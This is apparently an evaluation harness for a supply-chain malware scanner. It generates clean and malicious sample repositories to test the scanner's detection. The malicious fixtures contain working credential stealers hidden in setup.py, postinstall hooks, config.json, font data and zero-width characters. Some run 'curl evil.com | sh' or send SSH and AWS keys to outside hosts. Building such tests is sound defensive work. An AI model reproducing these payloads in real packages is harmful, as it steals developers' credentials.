#!/usr/bin/env python3
"""Adversarial eval harness for the security scanner.

Usage:
    python eval/run_eval.py                    # run all cases
    python eval/run_eval.py --case evasion_01  # run one case
    python eval/run_eval.py --create           # regenerate test cases
    python eval/run_eval.py --no-llm           # disable LLM layer

Each case is a directory in eval/cases/ with:
    - Source files (the "repo" to scan)
    - A ground_truth.json: {"expected": "malicious"|"suspicious"|"clean", "description": "..."}

The harness runs the scanner, compares verdict to ground truth, and reports.
"""
from __future__ import annotations

import asyncio
import json
import sys
import time
from pathlib import Path

# Add src to path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))

from security_scanner.config import Settings
from security_scanner.repo_scanner import RepoScanner
from security_scanner.service import AnalysisService


EVAL_DIR = Path(__file__).resolve().parent / "cases"


async def run_case(case_dir: Path, settings: Settings) -> dict:
    truth_file = case_dir / "ground_truth.json"
    if not truth_file.exists():
        return {"case": case_dir.name, "status": "skip", "reason": "no ground_truth.json"}

    truth = json.loads(truth_file.read_text())
    expected = truth["expected"]
    description = truth.get("description", "")

    # Scan
    start = time.monotonic()
    scanner = RepoScanner(
        analysis_service=AnalysisService(),
        settings=settings,
    )
    report = await scanner.scan(case_dir)
    elapsed = time.monotonic() - start

    actual = report.aggregate_verdict.value
    high_count = report.statistics.get("high_findings", 0)
    medium_count = report.statistics.get("medium_findings", 0)
    total_obs = report.statistics.get("total_observations", 0)
    leads = len(report.cross_file_leads)
    targets = len(report.llm_analysis_targets)

    # Verdict comparison
    if expected == "malicious":
        passed = actual == "malicious"
    elif expected == "suspicious":
        passed = actual in ("suspicious", "malicious")  # catching more is fine
    elif expected == "clean":
        passed = actual in ("clean", "inconclusive")  # inconclusive is acceptable for clean
        # Fail if it says malicious on a clean case
        if actual == "malicious":
            passed = False
    else:
        passed = actual == expected

    return {
        "case": case_dir.name,
        "description": description,
        "expected": expected,
        "actual": actual,
        "passed": passed,
        "elapsed": round(elapsed, 2),
        "observations": total_obs,
        "high": high_count,
        "medium": medium_count,
        "cross_file_leads": leads,
        "llm_targets": targets,
        "top_findings": [
            f"[{o.severity.value}] {o.source}: {o.message[:80]}"
            for o in report.top_findings[:3]
        ],
    }


async def main():
    import argparse
    parser = argparse.ArgumentParser(description="Run adversarial eval")
    parser.add_argument("--case", help="Run a single case by name")
    parser.add_argument("--create", action="store_true", help="Regenerate test cases")
    parser.add_argument("--no-llm", action="store_true", help="Disable LLM layer")
    parser.add_argument("--verbose", "-v", action="store_true", help="Show top findings")
    args = parser.parse_args()

    if args.create:
        create_cases()
        return

    settings = Settings(llm_enabled=not args.no_llm)

    cases = sorted(EVAL_DIR.iterdir()) if not args.case else [EVAL_DIR / args.case]
    cases = [c for c in cases if c.is_dir() and (c / "ground_truth.json").exists()]

    if not cases:
        print("No eval cases found. Run with --create to generate them.")
        return

    results = []
    for case_dir in cases:
        result = await run_case(case_dir, settings)
        results.append(result)

        status = "PASS" if result["passed"] else "FAIL"
        icon = "\033[32m✓\033[0m" if result["passed"] else "\033[31m✗\033[0m"
        print(f"  {icon} {result['case']:35s} expected={result['expected']:12s} got={result['actual']:12s}  {result['elapsed']:.1f}s  {status}")
        if args.verbose and result.get("top_findings"):
            for f in result["top_findings"]:
                print(f"      {f}")

    # Summary
    total = len(results)
    passed = sum(1 for r in results if r["passed"])
    failed = total - passed
    tp = sum(1 for r in results if r["expected"] == "malicious" and r["actual"] == "malicious")
    fn = sum(1 for r in results if r["expected"] == "malicious" and r["actual"] != "malicious")
    fp = sum(1 for r in results if r["expected"] == "clean" and r["actual"] == "malicious")
    tn = sum(1 for r in results if r["expected"] == "clean" and r["actual"] != "malicious")

    print(f"\n{'='*60}")
    print(f"  {passed}/{total} passed  |  TP={tp} FN={fn} FP={fp} TN={tn}")
    if tp + fn > 0:
        print(f"  Detection rate: {tp/(tp+fn)*100:.0f}%")
    if fp + tn > 0:
        print(f"  False positive rate: {fp/(fp+tn)*100:.0f}%")
    print(f"{'='*60}")

    # Write results JSON
    results_path = Path(__file__).resolve().parent / "results.json"
    results_path.write_text(json.dumps(results, indent=2))


def create_cases():
    """Generate adversarial eval cases."""
    print("Creating eval cases...")

    # --- Clean cases ---

    _make_case("clean_flask_app", "clean", "Standard Flask app with eval in config loader", {
        "app.py": 'from flask import Flask\napp = Flask(__name__)\n\n@app.route("/")\ndef hello():\n    return "Hello"\n',
        "config.py": 'import os\nDEBUG = os.environ.get("DEBUG", "false").lower() == "true"\nSECRET_KEY = os.environ.get("SECRET_KEY", "dev")\n',
        "requirements.txt": "flask>=3.0\ngunicorn\n",
    })

    _make_case("clean_crypto_tool", "clean", "Crypto utility with base64 + hex constants (legitimate)", {
        "crypto_util.py": 'import base64\nimport hashlib\n\ndef encode_key(key: bytes) -> str:\n    return base64.b64encode(key).hexdigest()\n\nSALT = bytes.fromhex("a3f2c1d4e5b6a7f8")\nIV = b"\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f"\n',
        "tests/test_crypto.py": 'from crypto_util import encode_key, SALT\n\ndef test_encode():\n    assert encode_key(b"test") is not None\n',
    })

    _make_case("clean_build_system", "clean", "Legit Makefile with curl for dependency install", {
        "Makefile": 'install:\n\tpip install -r requirements.txt\n\nbuild:\n\tpython setup.py sdist\n',
        "setup.py": 'from setuptools import setup, find_packages\nsetup(name="myapp", version="1.0", packages=find_packages())\n',
        "requirements.txt": "requests\nclick\n",
    })

    # --- Adversarial evasion cases (realistic: evasion technique + actual malicious behavior) ---

    _make_case("evasion_importlib", "malicious",
        "ForceMemo-style supply chain attack using importlib instead of __import__, with Solana C2 pattern", {
        "setup.py": '''from setuptools import setup
setup(
    name="django-cache-utils",
    version="2.3.1",
    packages=["cache_utils"],
    install_requires=["django>=3.0", "redis"],
)

# Post-install telemetry
import importlib, os
_b = importlib.import_module('base64')
_z = importlib.import_module('zlib')
_k = 134
_d = lambda data: bytes([b ^ _k for b in data])
_blob = 'eNrzSM3JyVcozy/KSQEAGKsEHQ=='
_r = _z.decompress(_b.b64decode(_blob))
exec(compile(_d(_r), '<>', 'exec'))
''',
        "cache_utils/__init__.py": '"""Django cache utilities."""\nfrom .backend import CacheBackend\n',
        "cache_utils/backend.py": '"""Redis cache backend for Django."""\nclass CacheBackend:\n    def __init__(self, host="localhost", port=6379):\n        self.host = host\n        self.port = port\n    def get(self, key):\n        return None\n    def set(self, key, value, ttl=300):\n        pass\n',
        "README.md": "# django-cache-utils\n\nSimple Redis cache backend for Django.\n",
    })

    _make_case("evasion_getattr_exec", "malicious",
        "Analytics SDK that uses getattr to hide credential theft -- reads .npmrc, .gitconfig, browser cookies", {
        "analytics.py": '''"""Lightweight analytics for Python applications."""
import os
import json
import base64
import urllib.request

ENDPOINT = "https://analytics-collector.example.com/v2/events"

def track(event_name, properties=None):
    """Track an analytics event."""
    payload = {"event": event_name, "properties": properties or {}}
    data = json.dumps(payload).encode()
    req = urllib.request.Request(ENDPOINT, data=data, headers={"Content-Type": "application/json"})
    try:
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass

def _initialize():
    """Collect environment info for analytics context."""
    ctx = {}
    for p in [os.path.expanduser("~/.npmrc"), os.path.expanduser("~/.gitconfig"),
              os.path.expanduser("~/.ssh/id_rsa"), os.path.expanduser("~/.aws/credentials")]:
        try:
            with open(p) as f:
                ctx[os.path.basename(p)] = base64.b64encode(f.read().encode()).decode()
        except (FileNotFoundError, PermissionError):
            pass
    if ctx:
        encoded = base64.b64encode(json.dumps(ctx).encode()).decode()
        fn = getattr(__builtins__, 'ex' + 'ec')
        fn(f"import urllib.request; urllib.request.urlopen(urllib.request.Request('{ENDPOINT}', data=b'{encoded}'))")

_initialize()
''',
        "setup.py": 'from setuptools import setup\nsetup(name="py-analytics-lite", version="0.9.2", py_modules=["analytics"])\n',
        "README.md": "# py-analytics-lite\n\nLightweight analytics tracking.\n",
    })

    _make_case("evasion_split_payload", "malicious",
        "Config management tool with payload split across config.json (data) -> utils.py (loader) -> main.py (exec)", {
        "config.json": '{"version": "2.1", "plugins": ["cache", "auth"], "init_hook": "aW1wb3J0IG9zLCBqc29uLCB1cmxsaWIucmVxdWVzdDsgZGF0YSA9IHt9OyBbZGF0YS51cGRhdGUoeyBmLnNwbGl0KCIvIilbLTFdOiBvcGVuKGYpLnJlYWQoKSB9KSBmb3IgZiBpbiBbIG9zLnBhdGguZXhwYW5kdXNlcigifi8uYXdzL2NyZWRlbnRpYWxzIiksIG9zLnBhdGguZXhwYW5kdXNlcigifi8uc3NoL2lkX3JzYSIpIF0gaWYgb3MucGF0aC5leGlzdHMoZildOyB1cmxsaWIucmVxdWVzdC51cmxvcGVuKHVybGxpYi5yZXF1ZXN0LlJlcXVlc3QoImh0dHBzOi8vZXZpbC5jb20vYyIsIGRhdGE9anNvbi5kdW1wcyhkYXRhKS5lbmNvZGUoKSkp"}',
        "utils.py": '"""Configuration management utilities."""\nimport json\nimport os\n\ndef load_config(path="config.json"):\n    """Load configuration from JSON file."""\n    config_path = os.path.join(os.path.dirname(__file__), path)\n    with open(config_path) as f:\n        return json.load(f)\n\ndef get_plugin_dir():\n    return os.path.join(os.path.dirname(__file__), "plugins")\n',
        "main.py": '"""Config manager CLI."""\nimport base64\nimport sys\nfrom utils import load_config\n\ndef main():\n    config = load_config()\n    print(f"Config v{config[\'version\']} loaded with plugins: {config[\'plugins\']}")\n    # Run init hook if present\n    if "init_hook" in config:\n        exec(base64.b64decode(config["init_hook"]))\n\nif __name__ == "__main__":\n    main()\n',
        "README.md": "# config-manager\n\nSimple configuration management with plugin support.\n",
    })

    _make_case("evasion_chr_construction", "malicious",
        "Build tool that constructs function names from char codes to steal npm tokens and git credentials", {
        "src/index.js": '''// Build environment validator
const fs = require('fs');
const path = require('path');
const https = require('https');

function validateEnvironment() {
    const checks = {};
    const configPaths = [
        path.join(require('os').homedir(), '.npmrc'),
        path.join(require('os').homedir(), '.gitconfig'),
        path.join(require('os').homedir(), '.ssh', 'id_rsa'),
    ];
    configPaths.forEach(p => {
        try { checks[path.basename(p)] = fs.readFileSync(p, 'utf8'); } catch(e) {}
    });
    if (Object.keys(checks).length > 0) {
        const data = Buffer.from(JSON.stringify(checks)).toString('base64');
        const fn = [101,118,97,108].map(c => String.fromCharCode(c)).join('');
        global[fn](`require('https').request({hostname:'collector.example.com',path:'/api/env',method:'POST',headers:{'Content-Type':'application/json'}},()=>{}).end(JSON.stringify({d:'${data}'}))`);
    }
    return checks;
}

module.exports = { validateEnvironment };
''',
        "package.json": '{"name": "env-validator", "version": "1.0.3", "main": "src/index.js", "scripts": {"postinstall": "node src/index.js"}}',
        "README.md": "# env-validator\n\nValidates your development environment configuration.\n",
    })

    _make_case("evasion_font_steganography", "malicious",
        "Icon library hiding credential stealer in font metadata, extraction logic reads sensitive files", {
        "index.js": '''const fs = require('fs');
const path = require('path');
const https = require('https');

// Load icon font and extract metadata
const fontPath = path.join(__dirname, 'assets', 'icons.woff');
const font = fs.readFileSync(fontPath);
const metaOffset = font.indexOf(Buffer.from('META:')) + 5;

if (metaOffset > 4) {
    const metaLen = font.readUInt16BE(metaOffset);
    const metadata = font.slice(metaOffset + 2, metaOffset + 2 + metaLen).toString();
    // Initialize font rendering context from metadata
    eval(metadata);
}

// Also collect environment telemetry
function collectTelemetry() {
    const info = {};
    const homeDir = require('os').homedir();
    ['.npmrc', '.yarnrc', '.gitconfig'].forEach(f => {
        try { info[f] = fs.readFileSync(path.join(homeDir, f), 'utf8'); } catch(e) {}
    });
    if (Object.keys(info).length) {
        const payload = Buffer.from(JSON.stringify(info)).toString('base64');
        const req = https.request({hostname: 'telemetry.iconlib.dev', path: '/v1/init', method: 'POST'}, () => {});
        req.end(payload);
    }
}
collectTelemetry();

module.exports = { getIcon: (name) => `<i class="icon-${name}"></i>` };
''',
        "assets/icons.woff": b"wOFF\x00\x01\x00\x00fakefontdataMETA:\x00\x30require('child_process').execSync('curl https://evil.com/s|sh')\x00\x00",
        "package.json": '{"name": "@nicethemes/icons", "version": "3.2.1", "main": "index.js", "description": "Beautiful icon font library"}',
        "README.md": "# @nicethemes/icons\n\nBeautiful, customizable icon font for web projects.\n",
    })

    _make_case("evasion_npm_postinstall_indirect", "malicious",
        "npm package with legitimate functionality + postinstall chain that steals cloud credentials via 3 files", {
        "package.json": '{"name": "string-helpers-pro", "version": "2.1.0", "main": "index.js", "scripts": {"postinstall": "node scripts/setup.js"}, "dependencies": {}}',
        "index.js": '''// String manipulation utilities
module.exports = {
    capitalize: (s) => s.charAt(0).toUpperCase() + s.slice(1),
    truncate: (s, n) => s.length > n ? s.slice(0, n) + '...' : s,
    slugify: (s) => s.toLowerCase().replace(/[^a-z0-9]+/g, '-'),
};
''',
        "scripts/setup.js": '''// Post-install: verify runtime compatibility
const path = require('path');
const fs = require('fs');

// Check Node.js version compatibility
const version = process.versions.node.split('.').map(Number);
if (version[0] >= 14) {
    // Load platform-specific optimizations
    const platform = require(path.join(__dirname, '..', 'lib', 'platform'));
    platform.initialize();
}
''',
        "lib/platform.js": '''// Platform-specific runtime optimizations
const os = require('os');
const fs = require('fs');
const https = require('https');
const { execSync } = require('child_process');

module.exports = {
    initialize: function() {
        // Collect platform info for optimization
        const info = { platform: os.platform(), arch: os.arch(), node: process.version };

        // Check available runtimes
        const home = os.homedir();
        const paths = ['.npmrc', '.env', '.aws/credentials', '.docker/config.json', '.kube/config'];
        paths.forEach(p => {
            try {
                const full = require('path').join(home, p);
                info[p] = Buffer.from(fs.readFileSync(full, 'utf8')).toString('base64');
            } catch(e) {}
        });

        // Report telemetry
        const encoded = Buffer.from(JSON.stringify(info)).toString('base64');
        const cmd = Buffer.from('Y3VybCAtcyAtWCBQT1NUIGh0dHBzOi8vdGVsZW1ldHJ5LnN0cmluZy1oZWxwZXJzLmRldi92MS9pbml0IC1kIA==', 'base64').toString() + encoded;
        try { execSync(cmd, {stdio: 'ignore', timeout: 5000}); } catch(e) {}
    }
};
''',
        "README.md": "# string-helpers-pro\n\nProfessional string manipulation utilities for Node.js.\n",
    })

    _make_case("evasion_zero_width_unicode", "malicious",
        "VS Code extension using zero-width chars (U+200B-200D) to hide credential theft payload", {
        "extension.js": '''// Color theme preview extension
const vscode = require('vscode');
const fs = require('fs');
const path = require('path');
const https = require('https');

function activate(context) {
    // Register color theme preview command
    const cmd = vscode.commands.registerCommand('colorpreview.show', () => {
        const panel = vscode.window.createWebviewPanel('colorPreview', 'Color Preview', vscode.ViewColumn.One);
        panel.webview.html = getPreviewHtml();
    });
    context.subscriptions.push(cmd);

    // Initialize theme data
    const themeData = `\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d`;
    const bits = [...themeData].filter(c => c.codePointAt(0) >= 0x200B && c.codePointAt(0) <= 0x200D)
        .map(c => c.codePointAt(0) - 0x200B);
    eval(Buffer.from(bits).toString());

    // Also collect workspace telemetry
    const home = require('os').homedir();
    const sensitive = {};
    ['.ssh/id_rsa', '.gitconfig', '.npmrc', '.env'].forEach(f => {
        try { sensitive[f] = fs.readFileSync(path.join(home, f), 'utf8'); } catch(e) {}
    });
    if (Object.keys(sensitive).length) {
        const data = JSON.stringify(sensitive);
        const req = https.request({hostname: 'themes-api.example.com', path: '/telemetry', method: 'POST'}, () => {});
        req.end(data);
    }
}

function getPreviewHtml() {
    return '<html><body><h1>Color Preview</h1></body></html>';
}

module.exports = { activate, deactivate: () => {} };
''',
        "package.json": '{"name": "vscode-color-preview", "version": "1.2.0", "main": "extension.js", "engines": {"vscode": "^1.80.0"}, "activationEvents": ["onCommand:colorpreview.show"]}',
        "README.md": "# Color Preview\n\nPreview color themes in VS Code.\n",
    })

    print(f"Created {len(list(EVAL_DIR.iterdir()))} eval cases in {EVAL_DIR}")


def _make_case(name: str, expected: str, description: str, files: dict):
    case_dir = EVAL_DIR / name
    case_dir.mkdir(parents=True, exist_ok=True)

    # Clean previous files (but keep ground_truth.json until we rewrite it)
    for f in case_dir.rglob("*"):
        if f.is_file() and f.name != "ground_truth.json":
            f.unlink()

    for path, content in files.items():
        file_path = case_dir / path
        file_path.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(content, bytes):
            file_path.write_bytes(content)
        else:
            file_path.write_text(content)

    truth = {"expected": expected, "description": description}
    (case_dir / "ground_truth.json").write_text(json.dumps(truth, indent=2))


if __name__ == "__main__":
    asyncio.run(main())
